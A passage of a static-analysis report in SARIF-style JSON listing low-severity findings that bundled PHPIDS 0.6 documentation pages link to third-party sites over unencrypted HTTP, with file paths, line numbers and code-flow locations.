        "text" : "The file IDS_Caching_Database.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1BEA368246DB744C9434AC35883C8764"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Database.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Database.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4407",
      "message" : {
        "text" : "The file IDS_Caching_Database.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1BEA368246DB744C9434AC35883C8765"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Database.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Database.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4408",
      "message" : {
        "text" : "The file IDS_Caching_Database.html on line 241 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1BEA368246DB744C9434AC35883C8766"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
          },
          "region" : {
            "startLine" : 241,
            "endLine" : 241,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Database.html:241"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
                },
                "region" : {
                  "startLine" : 241
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Database.html:241"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Database.html"
                },
                "region" : {
                  "startLine" : 241
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4543",
      "message" : {
        "text" : "The file IDS_Caching_File.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7002F14B9BB38CBDE5B78F0D2EF657E6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_File.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_File.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4544",
      "message" : {
        "text" : "The file IDS_Caching_File.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7002F14B9BB38CBDE5B78F0D2EF657E7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_File.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_File.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4545",
      "message" : {
        "text" : "The file IDS_Caching_File.html on line 239 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7002F14B9BB38CBDE5B78F0D2EF657E8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
          },
          "region" : {
            "startLine" : 239,
            "endLine" : 239,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_File.html:239"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
                },
                "region" : {
                  "startLine" : 239
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_File.html:239"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_File.html"
                },
                "region" : {
                  "startLine" : 239
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4373",
      "message" : {
        "text" : "The file IDS_Caching_Interface.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "07690CB1D72EC58360BB6A34522D345A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Interface.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Interface.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4374",
      "message" : {
        "text" : "The file IDS_Caching_Interface.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "07690CB1D72EC58360BB6A34522D345B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Interface.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Interface.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4375",
      "message" : {
        "text" : "The file IDS_Caching_Interface.html on line 143 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "07690CB1D72EC58360BB6A34522D345C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
          },
          "region" : {
            "startLine" : 143,
            "endLine" : 143,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Interface.html:143"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
                },
                "region" : {
                  "startLine" : 143
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Interface.html:143"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Interface.html"
                },
                "region" : {
                  "startLine" : 143
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4467",
      "message" : {
        "text" : "The file IDS_Caching_Memcached.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4450ED2B62850D62AE951A9844C2821C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Memcached.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Memcached.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4468",
      "message" : {
        "text" : "The file IDS_Caching_Memcached.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4450ED2B62850D62AE951A9844C2821D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Memcached.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Memcached.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4469",
      "message" : {
        "text" : "The file IDS_Caching_Memcached.html on line 240 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4450ED2B62850D62AE951A9844C2821E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
          },
          "region" : {
            "startLine" : 240,
            "endLine" : 240,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Memcached.html:240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
                },
                "region" : {
                  "startLine" : 240
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Memcached.html:240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Memcached.html"
                },
                "region" : {
                  "startLine" : 240
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4464",
      "message" : {
        "text" : "The file IDS_Caching_Session.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "420180E8FBE76AC26E274D4FEA001C4B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Session.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Session.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4465",
      "message" : {
        "text" : "The file IDS_Caching_Session.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "420180E8FBE76AC26E274D4FEA001C4C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Session.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Session.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4466",
      "message" : {
        "text" : "The file IDS_Caching_Session.html on line 238 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "420180E8FBE76AC26E274D4FEA001C4D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
          },
          "region" : {
            "startLine" : 238,
            "endLine" : 238,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Session.html:238"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
                },
                "region" : {
                  "startLine" : 238
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching_Session.html:238"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching_Session.html"
                },
                "region" : {
                  "startLine" : 238
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4475",
      "message" : {
        "text" : "The file IDS_Converter.html on line 32 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4E246334D04ABDCB26CEFA0A987ECFF1"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
          },
          "region" : {
            "startLine" : 32,
            "endLine" : 32,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Converter.html:32"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Converter.html:32"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4476",
      "message" : {
        "text" : "The file IDS_Converter.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4E246334D04ABDCB26CEFA0A987ECFF2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Converter.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Converter.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4477",
      "message" : {
        "text" : "The file IDS_Converter.html on line 717 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4E246334D04ABDCB26CEFA0A987ECFF3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
          },
          "region" : {
            "startLine" : 717,
            "endLine" : 717,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Converter.html:717"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
                },
                "region" : {
                  "startLine" : 717
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Converter.html:717"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Converter.html"
                },
                "region" : {
                  "startLine" : 717
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4759",
      "message" : {
        "text" : "The file IDS_Event.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FDC8A69C8EDDB33B7891555FF970A5E4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
          },
          "region" : {
            "startLine" : 38,
            "endLine" : 38,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Event.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Event.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4760",
      "message" : {
        "text" : "The file IDS_Event.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FDC8A69C8EDDB33B7891555FF970A5E5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Event.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Event.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4761",
      "message" : {
        "text" : "The file IDS_Event.html on line 510 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FDC8A69C8EDDB33B7891555FF970A5E6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
          },
          "region" : {
            "startLine" : 510,
            "endLine" : 510,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Event.html:510"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
                },
                "region" : {
                  "startLine" : 510
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Event.html:510"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Event.html"
                },
                "region" : {
                  "startLine" : 510
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4510",
      "message" : {
        "text" : "The file IDS_Filter.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D5DF7E163324B3D3938851BD3800251"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4511",
      "message" : {
        "text" : "The file IDS_Filter.html on line 35 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D5DF7E163324B3D3938851BD3800252"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
          },
          "region" : {
            "startLine" : 35,
            "endLine" : 35,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter.html:35"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter.html:35"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4512",
      "message" : {
        "text" : "The file IDS_Filter.html on line 449 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D5DF7E163324B3D3938851BD3800253"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
          },
          "region" : {
            "startLine" : 449,
            "endLine" : 449,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter.html:449"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
                },
                "region" : {
                  "startLine" : 449
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter.html:449"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter.html"
                },
                "region" : {
                  "startLine" : 449
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4549",
      "message" : {
